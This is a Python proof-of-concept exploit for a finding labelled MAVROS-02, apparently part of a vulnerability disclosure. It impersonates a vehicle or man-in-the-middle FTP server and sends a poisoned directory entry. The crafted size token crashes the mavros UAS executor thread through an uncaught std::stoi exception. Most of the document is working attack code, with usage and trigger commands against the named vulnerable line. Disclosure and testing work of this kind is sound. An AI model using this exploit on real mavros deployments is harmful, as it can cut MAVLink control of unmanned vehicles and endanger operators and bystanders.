#!/usr/bin/env python3
"""
poison_ftp_list.py — MAVROS-02 proof-of-concept (DEFENSIVE, BENIGN)

Finding: MAVROS-02 — Uncaught exceptions in the mavros MAVLink-FTP handler crash
the UAS executor thread (malformed-reply DoS, CWE-248 / CWE-755).

This script is SELF-CONTAINED (no external imports beyond pymavlink) and acts as
a malicious vehicle / MITM FTP *server*. When the mavros `ftp` plugin (driven by
an operator running, e.g.,
`ros2 service call /mavros/ftp/list ...` or the rqt FTP widget) sends a
ListDirectory request, we answer with a single DIRENT_FILE ('F') entry whose
tab-separated size token is NON-NUMERIC ('x') — or, with --overflow, a value that
overflows a 32-bit int ('99999999999').

mavros parses the size with `std::stoi(name_size)` at
  mavros/src/plugins/ftp.cpp:830
inside `add_dirent()`, with no surrounding try/catch anywhere on the call path
(UAS::plugin_route -> handler, mavros_uas.cpp:220-230). A non-numeric token makes
std::stoi throw std::invalid_argument; an out-of-range value makes it throw
std::out_of_range. Either exception unwinds out of the rclcpp executor callback
and terminates the `uas-exec/...` thread (`exec.spin()`), taking the whole mavros
UAS node's MAVLink processing down with it.

BENIGN: the only payload is a crafted directory-listing string. Nothing is written,
executed, or fetched. Run ONLY against a mavros instance you own on localhost/bench.

Usage:
    # mavros connects to fcu_url:=tcp://127.0.0.1:5760  (we are the TCP server)
    python3 poison_ftp_list.py --listen 127.0.0.1:5760
    python3 poison_ftp_list.py --listen 127.0.0.1:5760 --overflow
    # or push to a mavros listening on UDP:
    python3 poison_ftp_list.py --udpout 127.0.0.1:14555

Then, from the mavros side, trigger an FTP list, e.g.:
    ros2 service call /mavros/ftp/list mavros_msgs/srv/FileList "{dir_path: '/'}"
"""
import struct
import sys
import os
...
# imports beyond pymavlink). Defines FakeVehicle, banner, observe, warn, ok,
# attack (+ wire helpers).
# ============================================================================
import argparse
import socket
...
class PoisonFTPVehicle(FakeVehicle):
    """Overrides _ftp_list to inject a raw, attacker-controlled size TOKEN
    (a string), instead of the harness default which always formats an int."""

    poison_token = b"x"   # non-numeric -> std::invalid_argument
    poison_name = "evil"

    def _ftp_list(self, req):
        offset = req["offset"]
        # Serve exactly one poisoned DIRENT_FILE entry, then EOF on the next page.
        if offset != 0:
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_LIST,
                            data=bytes([self.ERR_EOF]))
            return
        # Wire format for a file entry: 'F' + name + '\t' + SIZE_TOKEN + '\x00'
        entry = b"F" + self.poison_name.encode() + b"\t" + self.poison_token + b"\x00"
        attack("serving poisoned MAVFTP list entry: %r" % entry)
        attack("  -> mavros add_dirent() will call std::stoi(%r) at ftp.cpp:830"
               % self.poison_token.decode("latin-1"))
        self._ftp_reply(req, self.OP_ACK, size=len(entry), req_opcode=self.OP_LIST,
                        offset=offset, data=entry)


def main():
    banner("MAVROS-02  poison MAVFTP ListDirectory -> std::stoi throw -> exec thread crash")
    v = PoisonFTPVehicle.from_cli(
        "MAVROS-02 poison FTP list",
        extra_args=lambda p: p.add_argument(
            "--overflow", action="store_true",
            help="use 99999999999 (std::out_of_range) instead of 'x' (std::invalid_argument)"),
    )
    if getattr(v._args, "overflow", False):
        PoisonFTPVehicle.poison_token = b"99999999999"
        warn("using overflow token 99999999999 -> std::out_of_range")
    else:
        warn("using non-numeric token 'x' -> std::invalid_argument")

    v.start()
    observe("waiting for the mavros ftp plugin to send a ListDirectory request...")
    observe("trigger it on the mavros side, e.g.:")
    observe("  ros2 service call /mavros/ftp/list mavros_msgs/srv/FileList \"{dir_path: '/'}\"")
    ok("once the list is served, watch the mavros node: the 'uas-exec/...' thread")
    ok("will abort with terminate() called after throwing std::invalid_argument /")
    ok("std::out_of_range, and MAVLink processing will stop (DoS).")
    v.serve_forever()
